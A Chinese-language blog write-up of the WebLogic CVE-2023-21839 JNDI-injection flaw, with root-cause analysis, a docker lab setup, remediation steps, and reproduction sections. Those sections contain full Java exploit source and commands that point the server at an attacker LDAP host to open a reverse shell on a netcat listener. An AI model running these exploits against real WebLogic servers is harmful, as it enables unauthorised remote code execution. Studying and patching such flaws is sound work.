---
title: Weblogic未授权远程代码执行漏洞 (CVE-2023-21839)
date: 2023-03-27 17:53:34
tags: 漏洞分析
category: 渗透测试
---



## 1.漏洞简介

CVE-2023-21839 允许远程用户在未经授权的情况下通过 IIOP/T3 进行 JNDI lookup 操作，当 JDK 版本过低或本地存在小工具（javaSerializedData）时，这可能会导致 RCE 漏洞

- WebLogic_Server = 12.2.1.3.0
- WebLogic_Server = 12.2.1.4.0
- WebLogic_Server = 14.1.1.0.0



## 2.漏洞原理

简单总结版：	

> ​	由于Weblogic IIOP/T3协议存在缺陷，当IIOP/T3协议开启时，未经身份验证的攻击者通过IIOP/T3协议向受影响的服务器发送恶意的请求。**主要风险点是lookup方法的使用。**
>
> ​	漏洞原理其实是通过Weblogic t3/iiop协议支持远程绑定对象bind到服务端，当远程对象继承自OpaqueReference时，lookup查看远程对象时，服务端调用远程对象getReferent方法，其中的**remoteJNDIName参数可控**，导致攻击者可利用rmi/ldap远程协议进行远程命令执行。

参考📚：

> https://www.anquanke.com/post/id/287753
>
> https://xz.aliyun.com/t/12297
>
> ChatGPT源码分析：https://www.freebuf.com/vuls/359082.html
>
> 全英文：https://www.pingsafe.com/blog/cve-2023-21839-oracle-weblogic-server-core-patch-advisory
>
> goby分析+流程图https://www.4hou.com/posts/6x67 
>
> https://github.com/gobysec/Weblogic/blob/main/WebLogic_CVE-2023-21931_zh_CN.md
>
> https://nosec.org/home/detail/5079.html
>
> 源码追踪
>
> https://xz.aliyun.com/t/12452

### 2.1 Weblogic T3协议的RMI调用原理

​	RMI允许在不同的Java虚拟机（JVM）之间进行通信，使得一个Java程序可以调用另一个Java程序中的方法



<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403041730528.png" alt="RMI实现过程" style="zoom:50%;" />

​	

​	Weblogic RMI默认使用的传输协议是T3，无论是Java RMI还是Weblogic RMI，都需要使用JNDI调用远端的RMI服务。

​	JNDI的查找一般使用lookup()方法。常规Weblogic漏洞在反序列化时触发，流量中的序列化数据没有校验完全，恶意数据被反序列化出Class对象，并调用构造函数，若构造函数里有关于命令执行的指令，远程代码执行即可实现。而本次分析的新漏洞触发在反序列化后的lookup()调用中。

​	**<u>CVE-2023-21839漏洞原理</u>**：绑定远程对象到服务端JNDI服务后，在客户端执行lookup操作时，如果远程对象为ForeignOpaqueReference，客户端查找时会触发服务端调用ForeignOpaqueReference.getReferent方法，该方法会执行lookup查找，通过可控remoteJNDIName参数构造LDAP服务器可以实现远程命令执行，流程图如下👇🏻

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403041730529.png" alt="CVE-2023-21839漏洞原理流程图" style="zoom:50%;" />

​	

### 2.2 源码RCE利用链

​	weblogic.deployment.jms.ForeignOpaqueReference类：继承于OpaqueReference接口，该接口用于在不同的JVM之间通过命名服务传递对象引用。当对象实现此接口，通过lookup检索WLContext时，命名服务会调用getReferent() 返回对象。

​	**漏洞入口ForeignOpaqueReference.getReferent**方法源码：

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403041730530.png" alt="漏洞入口getReferent方法部分源码" style="zoom:50%;" />



​	1）首先检查JNDI环境，如果没有设置JNDI环境变量，则使用默认的InitialContext对象创建context。否则，则使用指定的this.jndiEnvironment通过InitialContext对象创建context，并检查java.naming.factory.initial属性：该属性指定JNDI实现的工厂类。jndiEnvironment是private属性，可通过反射赋值。

​	2）retVal = context.lookup(evalMacros(this.remoteJNDIName)); 通过远程JNDI名称查找并返回一个对象，然后将其赋值给变量retVal。remoteJNDIName是private属性，**可通过反射赋值**



**<u>那么构造漏洞利用代码：</u>**

​	1）创建InitialContext对象，配置JNDI的接口连接Weblogic服务器的环境属性：指定目标服务器的URL地址和初始上下文工厂的实现类。

```
Hashtable env = new Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
env.put(Context.PROVIDER_URL, url);
InitialContext c = new InitialContext(env);
```

​	2）利用反射赋值ForeignOpaqueReference对象中的jndiEnvironment和remoteJNDIName为LDAP服务器。

```
env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.rmi.registry.RegistryContextFactory"); //设置java.naming.factory.initial属性
Field jndiEnvironment = ForeignOpaqueReference.class.getDeclaredField("jndiEnvironment");
jndiEnvironment.setAccessible(true);
jndiEnvironment.set(f, env);  //jndiEnvironment赋值
Field remoteJNDIName = ForeignOpaqueReference.class.getDeclaredField ("remoteJNDIName");
remoteJNDIName.setAccessible(true);
String ldap = "ldap://xxx ";
remoteJNDIName.set(f, ldap); //remoteJNDIName赋值
```

​	3）调用InitialContext对象的bind方法将ForeignOpaqueReference对象绑定到JNDI服务，名称随机。

```
String bindName = new Random(System.currentTimeMillis()).nextLong()+"";
c.bind(bindName,f);
```

​	4）最后调用InitialContext对象的lookup方法：c.lookup(bindName)。JNDI服务就会查询绑定对象，触发访问远程LDAP服务器，借此实现远程代码执行。漏洞RCE利用链如下

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403041730531.png" alt="漏洞利用链" style="zoom:50%;" />



​	漏洞利用时，配合JNDIExploit 工具：JNDI攻击通过引用远程类加载，那么配合工具启动LDAP服务器，将客户端连接到本地LDAP服务器，发送有效载荷。

​	该漏洞基于JNDI注入，**由于JDK 8u121之后的版本默认com.sun.jndi.ldap.object.trustURLCodebase为false，关闭远程加载类库，无法RMI注入，但可以通过LDAP协议实现JNDI注入**。**而8u191之后的版本LDAP也被禁止，<u>所以Weblogic服务端Java版本过旧时RCE才能实现**</u>

## 3.漏洞复现



> jndi server利用工具：使用JNDIExploit.jar工具开启LDAP和WEB服务
>
> https://github.com/WhiteHSBG/JNDIExploit
>
> 保姆级全教程：
>
> https://bianchengsite.com/u0WeilTZFCR5-t0k6LF7RA

目标机：Centos 7,java8,vps：1.xxx.xxx.172



搭建环境：

1.在vps靶机 docker上搭建**Weblogic server 12.2.1.3环境**【vulhub搭建的环境】

​	docker-compose.yml：

```
version: '2'
services:
weblogic:
image: vulhub/weblogic:12.2.1.3-2018
ports:
-"7001:7001"
```

​	定位到文件所在位置，终端输入命令

```
cd /root/vulhub-master/weblogic/CVE-2023-21839  //vulhub搭建环境
cd CVE-2023-21839
docker-compose up -d
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304151753405.png" alt="启动docker环境" style="zoom:50%;" />



2.攻击机访问http://1.xxx.xxx.172:7001/,进入后台http://1.xxx.xxx.172:7001/console/，环境搭建成功

![docker搭建](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304151755886.png)





<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402131803357.png" alt="weblogic环境搭建" style="zoom:50%;" />



### poc1

https://github.com/4ra1n/CVE-2023-21839

#### 漏洞探测

查看DNSlog网站访问记录即可判断漏洞是否存在。

攻击机运行poc

【内网docker靶机地址：172.17.0.1】

```
./poc2 -ip 172.17.0.1 -port 7001 -ldap ldap://wpaat8.dnslog.cn
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304161716296.png" alt="运行poc" style="zoom:50%;" />





dnslog存在回显，说明存在漏洞：

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402131805506.png" alt="image-20240213180551455" style="zoom: 33%;" />





#### 本地利用拿shell

目标机：vps上本地docker搭建的weblogic环境，ip：172.17.0.1

攻击机：vps：1.xxx.xxx.172



搭建恶意jndiserver，位置：vps

> 一款用于 `JNDI注入` 利用的工具，大量参考/引用了 `Rogue JNDI` 项目的代码，支持直接`植入内存shell`，并集成了常见的`bypass 高版本JDK`的方式，适用于与自动化工具配合使用。
>
> https://github.com/WhiteHSBG/JNDIExploit
>

vps运行jdni server，公网开启rmi服务

```
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 1.xxx.xxx.172
```

![开启jndi服务](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402161951377.png)



**⚠️注意搭建ldapserver的服务器需要开启1389和3456端口，否则无法收到目标机的请求**



vps本地监听5003端口，等待反弹shell

```
nc -lvvp 5003
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304161724373.png" alt="本地监听5003端口" style="zoom:50%;" />



go编译poc

go编译设置操作系统为linu【通过GOOS设置编译操作系统，使用GOARCH设置CPU架构，即编译后的二进制文件要在哪个操作系统的哪个CPU架构上运行】

```
go build -o poc2 【mac】
GOOS=linux GOARCH=amd64 go build -o poc2
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304161708621.png" alt="go编译poc" style="zoom:50%;" />



运行poc利用,反弹shell

```
./poc2 -ip 172.17.0.1 -port 7001 -ldap ldap://1.xxx.172:1389/Basic/ReverseShell/1.xxx.172/5003
```

![运行poc](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402161953411.png)



ldap服务器收到请求

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402161954253.png" alt="ldap服务器" style="zoom:50%;" />



监听端口拿到shell

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402161955415.png" alt="getshell" style="zoom:50%;" />



### poc2

https://github.com/DXask88MA/Weblogic-CVE-2023-21839

原始：

```java
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.lang.reflect.Field;
import java.util.Hashtable;


public class poc {
    static String JNDI_FACTORY="weblogic.jndi.WLInitialContextFactory";
    private static InitialContext getInitialContext(String url)throws NamingException
    {
        Hashtable<String,String> env = new Hashtable<String,String>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
        env.put(Context.PROVIDER_URL, url);
        return new InitialContext(env);
    }
    //iiop
    public static void main(String args[]) throws Exception {
        InitialContext c=getInitialContext("t3://172.23.a.b:7001");
        Hashtable<String,String> env = new Hashtable<String,String>();

        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        weblogic.deployment.jms.ForeignOpaqueReference f=new weblogic.deployment.jms.ForeignOpaqueReference();
        Field jndiEnvironment=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField("jndiEnvironment");
        jndiEnvironment.setAccessible(true);
        jndiEnvironment.set(f,env);
        Field remoteJNDIName=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField("remoteJNDIName");
        remoteJNDIName.setAccessible(true);
        remoteJNDIName.set(f,"ldap://172.23.c.d:1389/Basic/Command/calc");
        c.bind("aaa120",f);
        c.lookup("aaa120");

    }

}
```



大佬写的改版的：

```java
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.lang.reflect.Field;
import java.util.Hashtable;
import java.util.Random;

public class CVE_2023_21839 {
    static String JNDI_FACTORY="weblogic.jndi.WLInitialContextFactory";
    static String HOW_TO_USE="[*]java -jar 目标ip:端口 ldap地址\ne.g. java -jar 192.168.220.129:7001 ldap://192.168.31.58:1389/Basic/ReverseShell/192.168.220.129/1111";

    private static InitialContext getInitialContext(String url)throws NamingException
    {
        Hashtable<String,String> env = new Hashtable<String,String>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
        env.put(Context.PROVIDER_URL, url);
        return new InitialContext(env);
    }
    public static void main(String args[]) throws Exception {
        if(args.length <2){
            System.out.println(HOW_TO_USE);
            System.exit(0);
        }
        String t3Url = args[0];
        String ldapUrl = args[1];
        InitialContext c=getInitialContext("t3://"+t3Url);
        Hashtable<String,String> env = new Hashtable<String,String>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        weblogic.deployment.jms.ForeignOpaqueReference f=new weblogic.deployment.jms.ForeignOpaqueReference();
        Field jndiEnvironment=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField("jndiEnvironment");
        jndiEnvironment.setAccessible(true);
        jndiEnvironment.set(f,env);
        Field remoteJNDIName=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField("remoteJNDIName");
        remoteJNDIName.setAccessible(true);
        remoteJNDIName.set(f,ldapUrl);
        String bindName = new Random(System.currentTimeMillis()).nextLong()+"";
        try{
            c.bind(bindName,f);
            c.lookup(bindName);
        }catch(Exception e){ }

    }
}
```



poc使用方法：	

​	编写并打包的EXP利用工具Weblogic-CVE-2023-21839.jar，然后使用`java -jar 目标IP:端口 LDAP地址`

#### 漏洞探测

同理查看DNSlog网站访问记录即可判断漏洞是否存在。

**攻击者要记得使用`java8`的环境，不然会报错**

```
java -jar Weblogic-CVE-2023-21839.jar 172.17.0.1:7001 ldap://o712i0.dnslog.cn
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304161945367.png" alt="漏洞探测" style="zoom:50%;" />



#### 本地拿shell

攻击机类似前文搭建服jndi服务器，公网服务器centos本地监听5003端口，等待shell连接请求，然后运行如下命令：

```
java -jar Weblogic-CVE-2023-21839.jar 172.17.0.1:7001 ldap://1.xxx.172:1389/Basic/ReverseShell/1.xxx.172/5003
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402162004914.png" alt="运行exp" style="zoom:50%;" />



ldap服务器log记录：

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402162006380.png" alt="ldap服务器记录" style="zoom:50%;" />



攻击机5003端口拿到靶机shell

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402162012808.png" alt="getshell" style="zoom:50%;" />



## 4.注意事项&思考

1. **⚠️m1适配问题，docker weblogic环境搭建不起来**

​	本地测试的话里ldap服务设置的ip地址不要写0.0.0.0，要写公网服务器的IP/内网ip，不然无法获取到LDAP请求，弹shell弹不回来



2. poc的多目标检测：

> https://github.com/4ra1n/CVE-2023-21839/pull/1/commits/f62071a9b93f270f335fc83f8560b8e1f646dc23



poc依赖问题：需导入配置文件wlfullclient.jar，否则无法检测漏洞，先从docker里的weblogic环境下载到本地，也可以直接从网上下载

```shell
#进入vps docker weblogic环境
cd /root/vulhub-master/weblogic/CVE-2023-21839
docker-compose up -d

#进入终端【-t 选项让Docker分配一个伪终端（pseudo-tty）并绑定到容器的标准输入上
-i 则让容器的标准输入保持打开】启动一个 bash 终端用来交互  	# eac020c1c6XX 你的容器名/编码
docker exec -it eac020c1c6XX /bin/bash

#根据官网指令打包https://docs.oracle.com/en/middleware/fusion-middleware/weblogic-server/12.2.1.4/saclt/jarbuilder.html#GUID-54815E72-9837-4353-86BB-EA554C9A804D

java -jar wljarbuilder.jar

#dockers cp 容器ID:目标路径 本地文件路径  .复制容器内文件到vps本地/root/test下
docker cp eac020c1c6XX:/u01/oracle/wlserver/server/lib/wlfullclient.jar /root/test

#vps下载到本地
sz ./wlfullclient.jar
```

![依赖包的版本](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304211623290.png)



idea导入jar包，点击应用，点击确认，此时，poc依赖配置完毕

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304211644658.png" alt="导入依赖包" style="zoom: 33%;" />

## 5.修复方案

1、安装Oracle WebLogic Server最新安全补丁：
https://www.oracle.com/security-alerts/cpujan2023.html 



2、关闭T3和iiop协议端口

**漏洞利用T3协议进行攻击，如果程序不依赖T3协议进行JVM通信，通过阻断T3协议防止漏洞攻击是一种有效的防御措施。**具体来说，可以通过以下方法来实现：	

​	(1)禁用不必要的T3协议访问。可以通过配置WebLogic Server控制台来限制T3协议的使用，在base_domain配置页面，连接筛选器只允许特定的IP地址或主机名访问T3协议。

​	(2)加强T3协议的安全性。可以通过加密和身份验证等措施来保护T3协议的安全性，例如使用SSL/TLS协议加密T3协议通信，或者使用用户名和高强度密码进行身份验证

操作方法参考：https://help.aliyun.com/noticelist/articleid/1060577901.html



3、IIOP（Internet Inter-ORB Protocol）是一种面向对象的远程过程调用协议，用于在分布式系统中的对象之间进行通信。攻击者也可以利用IIOP协议的漏洞来执行恶意代码。为了防止利用IIOP协议漏洞攻击，可以通过关闭IIOP协议来实现。具体可采取以下措施：

​	(1)禁用IIOP协议：在应用服务器或者中间件中，可以通过配置文件或者管理界面禁用IIOP协议。如Weblogic控制台取消勾选IIOP选项。

​	(2)配置防火墙：在网络边界处配置防火墙，禁止IIOP协议的流量通过。

​	(3)更新软件版本：及时更新应用服务器或者中间件的软件版本，以修复已知的IIOP协议漏洞。

​	(4)加强访问控制：限制IIOP协议的访问权限，只允许授权的用户或者应用程序使用IIOP协议进行通信。



4、及时更新WebLogic Server。及时更新WebLogic Server可以修复已知的漏洞，从而避免攻击者利用T3协议进行攻击。



## 延伸参考

宋雁鸣,步春红.加固中间件WebLogic服务安全[J].网络安全和信息化,2017,No.16(08):117-118.

周正,孙海波.基于“Weblogic远程代码执行漏洞”谈网络安全问题防范[J].广播电视网络,2021,28(04):56-58.

Running Oracle WebLogic on containers [O] . Borja Aparicio Cotarelo, Antonio Nappi, Lukas Gedvilas, 2019